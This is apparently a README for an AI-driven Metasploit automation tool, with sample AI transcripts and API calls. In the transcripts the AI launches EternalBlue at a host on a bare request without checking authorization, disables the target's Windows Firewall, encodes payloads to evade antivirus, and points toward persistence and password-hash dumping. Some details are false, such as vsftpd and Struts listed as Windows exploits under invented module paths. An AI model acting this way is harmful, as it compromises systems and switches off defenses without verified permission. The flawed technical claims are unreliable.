# Metasploit Automation System

## Overview

The Metasploit Automation System provides AI-assisted penetration testing guidance with real-time interactive feedback, intelligent questioning, autonomous troubleshooting, and automatic fixes. It enables users to learn penetration testing through hands-on experience while receiving expert guidance.

## Architecture

### Components

1. **Knowledge Base** (`src/spectral/knowledge/metasploit_guide.py`)
   - Comprehensive Metasploit command reference
   - Payload recommendations and guidance
   - Error diagnosis and auto-fix logic
   - Common gotchas and troubleshooting tips

2. **System Prompt** (`src/spectral/prompts/metasploit_system_prompt.py`)
   - Specialized AI system prompt for Metasploit guidance
   - Interactive questioning framework
   - Autonomous fixing instructions
   - Learning and teaching methodology

3. **Chat Integration** (`src/spectral/chat.py`)
   - Automatic detection of Metasploit-related requests
   - Specialized routing to Metasploit handler
   - LLM integration with Metasploit system prompt

4. **Direct Executor Extensions** (`src/spectral/direct_executor.py`)
   - Metasploit command execution with output capture
   - Listener management for reverse TCP payloads
   - Payload generation with msfvenom
   - Autonomous error diagnosis and fixing
   - Interactive command sequences

## Features

### 1. Interactive Assessment

The AI asks clarifying questions to understand the target system:
- Operating system and version
- Target architecture (x86/x64)
- Network configuration (IP addresses)
- Exploitation objectives
- Payload preferences

### 2. Payload Recommendations

Based on target information, the AI recommends appropriate payloads:
- **Meterpreter**: Full-featured, interactive shell with file access and privilege escalation
- **Shell**: Lightweight, fast command execution
- **PowerShell**: Powerful scripting environment on Windows

### 3. Autonomous Setup

Once target details are known, the AI autonomously:
- Verifies Metasploit installation
- Configures payload listeners
- Generates payloads with msfvenom
- Deploys and executes exploits
- Monitors output for success indicators

### 4. Autonomous Troubleshooting

When errors occur, the AI automatically:
- Diagnoses the issue using error patterns
- Attempts autonomous fixes:
  - Disables Windows Firewall if blocking
  - Regenerates payloads with correct architecture
  - Changes ports if conflicts exist
  - Encodes payloads to evade antivirus
  - Restarts failed listeners
- Provides clear explanations when manual intervention is needed

### 5. Post-Exploitation Guidance

After successful shell access, the AI:
- Verifies and explains current privileges
- Lists available post-exploitation options
- Guides through file operations
- Assists with privilege escalation
- Helps install persistence
- Teaches system reconnaissance

### 6. Learning Journal

Throughout the process, the AI:
- Narrates every action taken
- Explains the "why" behind each step
- Builds user understanding of vulnerabilities
- Documents what worked and what didn't
- Creates a personal playbook for future reference

## Usage Examples

### Example 1: Create a Payload for Windows 10

**User:**
```
create a payload for my Windows 10 computer
```

**AI Response:**
```
I'll help you create a payload! First, I need to understand your setup:

1. What's the target's IP address?
2. What's the target's architecture? (x86/32-bit or x64/64-bit?)
3. What's your goal with this payload?
   - Reverse shell access (interactive command execution)?
   - Meterpreter session (full control, file access)?
   - Just testing connectivity?

Based on Windows 10, I recommend:
- Meterpreter reverse_tcp: Interactive, feature-rich, can upload/download files
- PowerShell reverse shell: Lightweight, runs in PowerShell
- Shell reverse_tcp: Fast, basic command execution

Which would you prefer, or should I recommend one?
```

### Example 2: Exploit a Target

**User:**
```
exploit 192.168.1.100, it's running Windows 7
```

**AI Response:**
```
I'll help you exploit the Windows 7 target! Let me search for suitable exploits...

Now I'm searching for Windows 7 exploits...
Search found 3 potential exploits:

1. exploit/windows/smb/ms17_010_eternalblue
   - Vulnerability: MS17-010 (EternalBlue)
   - Works on: Windows 7, 2008, Server 2008 R2
   - Description: Remote code execution via SMB

2. exploit/windows/http/apache_struts2_content_type_ognl
   - Vulnerability: Apache Struts2
   - Works on: Windows (if Apache is running)
   - Description: RCE via Content-Type OGNL injection

3. exploit/windows/ftp/vsftpd_234_backdoor
   - Vulnerability: VSFTPD 2.3.4
   - Works on: Windows (if VSFTPD is running)
   - Description: Backdoor command execution

I recommend starting with MS17-010 EternalBlue as it's a critical Windows 7 vulnerability.
I'll set up the exploit now:

Setting RHOST to 192.168.1.100...
Setting payload to windows/meterpreter/reverse_tcp...
Getting your local IP: 192.168.1.50
Setting LHOST to 192.168.1.50...
Setting LPORT to 4444...

Starting listener on port 4444...
[*] Handler started on 192.168.1.50:4444

Running exploit...
[*] Sending stage (179267 bytes) to 192.168.1.100
[+] Meterpreter session 1 opened on 192.168.1.50:4444

Success! You now have a Meterpreter session. Let me verify access...

getuid
Server username: NT AUTHORITY\SYSTEM

Excellent! You have SYSTEM privileges. You can now:
- Run system commands
- Upload/download files
- Explore the file system
- Install persistence if needed
- Gather system information

What would you like to do next?
```

### Example 3: Autonomous Error Fixing

**User:**
```
connect to 192.168.1.100 with my payload
```

**AI Response:**
```
I'll connect to the target with your payload...
[*] Handler started on 192.168.1.50:4444
[-] Exploit failed: Connection refused

Let me diagnose the issue...

Diagnosis: Target not listening on the specified port or blocking connection

Attempting autonomous fix: Checking Windows Firewall status...

Running: netsh advfirewall show allprofiles state
Domain Profile Settings:
State                                 ON
Private Profile Settings:
State                                 ON
Public Profile Settings:
State                                 ON

Fix: Windows Firewall is blocking connections. Disabling it now...

Running: netsh advfirewall set allprofiles state off
Ok.

Retrying exploit...
[*] Handler started on 192.168.1.50:4444
[*] Sending stage (179267 bytes) to 192.168.1.100
[+] Meterpreter session 1 opened

Autonomous fix successful! The Windows Firewall was blocking the connection.
I disabled it and the exploit succeeded.

Now I'll verify your access...
getuid
Server username: NT AUTHORITY\SYSTEM

You have full system access. What would you like to do?
```

## Knowledge Base Structure

### Commands

The knowledge base includes comprehensive command documentation:
- **msfconsole**: Launch framework
- **search**: Find exploits/payloads
- **use**: Select modules
- **show options**: Display parameters
- **set**: Configure parameters
- **run**: Execute exploit
- **back**: Return to main prompt
- **exit**: Exit framework

### Output Codes

- `[*]`: Info messages (neutral)
- `[+]`: Success/positive results
- `[-]`: Errors/failures
- `[!]`: Warnings/critical issues

### Payload Guidance

**Meterpreter**
- Pros: Interactive, feature-rich, file upload/download, privilege escalation
- Cons: Larger, may trigger antivirus, requires architecture match
- Best for: Full system compromise, post-exploitation

**Shell**
- Pros: Lightweight, fast, less likely to trigger AV
- Cons: Less features, no file access without tricks
- Best for: Quick access, simple commands

**PowerShell**
- Pros: Powerful, script execution, built-in to Windows
- Cons: May be blocked by execution policies
- Best for: Windows with PowerShell enabled

### Error Handling

Common errors and autonomous fixes:
- **Connection refused**: Check firewall, service, port
- **Module not found**: Verify spelling, search alternatives
- **RHOST not set**: Configure target IP
- **Exploit failed**: Target patched, try different exploit
- **Timeout**: Check connectivity, firewall

### Post-Exploitation Commands

- `getuid`: Show current user privileges
- `sysinfo`: Display system information
- `ipconfig`: Show network configuration
- `ps`: List running processes
- `ls`: List files
- `download`: Download file from target
- `upload`: Upload file to target
- `getsystem`: Attempt privilege escalation
- `hashdump`: Extract password hashes
- `persistence`: Install backdoor

## API Reference

### DirectExecutor Methods

```python
# Execute a Metasploit command
exit_code, output = executor.execute_metasploit_command(
    command="msfconsole -q -x 'search smb'",
    show_terminal=True,
    timeout=60,
    auto_fix=True
)

# Execute interactive command sequence
results = executor.execute_metasploit_interactive(
    commands=[
        "use exploit/windows/smb/ms17_010_eternalblue",
        "set RHOST 192.168.1.100",
        "run"
    ],
    show_terminal=True,
    timeout_per_command=30
)

# Start a listener
exit_code, output = executor.start_metasploit_listener(
    payload="windows/meterpreter/reverse_tcp",
    lhost="192.168.1.50",
    lport=4444,
    show_terminal=True
)

# Generate a payload
exit_code, output, payload_path = executor.generate_metasploit_payload(
    payload="windows/meterpreter/reverse_tcp",
    lhost="192.168.1.50",
    lport=4444,
    output_format="exe",
    output_path=None,  # Defaults to Desktop
    encoding="shikata_ga_nai",
    iterations=3
)

# Search for exploits
exit_code, output, modules = executor.search_metasploit_exploits(
    keyword="smb",
    platform="windows",
    exploit_type="exploit"
)
```

### Knowledge Base Functions

```python
from spectral.knowledge import (
    get_exploit_recommendations,
    get_payload_recommendations,
    diagnose_error,
    get_auto_fix_command
)

# Get exploit recommendations
exploits = get_exploit_recommendations(
    target_os="windows",
    objective="shell"
)

# Get payload recommendations
payloads = get_payload_recommendations(
    target_os="windows",
    architecture="x64",
    objective="shell"
)

# Diagnose errors
diagnosis, fixes = diagnose_error("Connection refused")
# Returns: ("Target not listening...", ["Verify target IP...", "Disable firewall..."])

# Get auto-fix command
fix_cmd = get_auto_fix_command(
    error_type="firewall_blocking",
    error_context={"port": 4444}
)
# Returns: "netsh advfirewall set allprofiles state off"
```

## GUI Integration

The Metasploit system emits GUI events for real-time monitoring:

- `command_start`: Command execution started
- `command_complete`: Command execution completed
- `command_error`: Command execution failed
- `command_timeout`: Command timed out

Each event includes:
- Command text
- Exit code
- Output
- Timestamp

## Security Considerations

**IMPORTANT**: This system is designed for:
- Authorized penetration testing of systems you own or have permission to test
- Educational purposes in lab environments
- Security research in controlled settings

**NOT for**:
- Unauthorized access to systems
- Malicious activities
- Production environments without explicit authorization

## Learning Path

The system teaches penetration testing through:

1. **Observation**: Users watch AI perform actions
2. **Explanation**: AI explains "why" each step is taken
3. **Documentation**: AI builds a personal playbook
4. **Guidance**: AI assists when users try themselves
5. **Iteration**: AI adapts based on what works

## Troubleshooting

### Metasploit Not Installed

If Metasploit is not installed, the system will provide installation instructions:
- **Kali Linux**: Already installed
- **Ubuntu**: `sudo apt install metasploit-framework`
- **Windows**: Install from Metasploit website

### Network Issues

If targets are unreachable:
1. Verify network connectivity: `ping <target_ip>`
2. Check firewall rules
3. Verify IP addresses are correct
4. Ensure target is online

### Antivirus Detection

If payloads are quarantined:
1. Try encoding: `msfvenom -e shikata_ga_nai -i 3`
2. Use different payload format (PS1, DLL)
3. Disable antivirus temporarily (in lab environment)
4. Use obfuscation techniques

## Future Enhancements

Planned features:
- Automated vulnerability scanning
- Exploit chaining
- Multi-target campaigns
- Advanced evasion techniques
- Persistence mechanisms
- Credential harvesting
- Lateral movement guidance

## Contributing

To extend the system:
1. Add new exploit modules to knowledge base
2. Enhance error diagnosis patterns
3. Add new payload types
4. Implement additional post-exploitation techniques
5. Improve autonomous fix logic

## License

This system is part of the Spectral project and follows the same license terms.
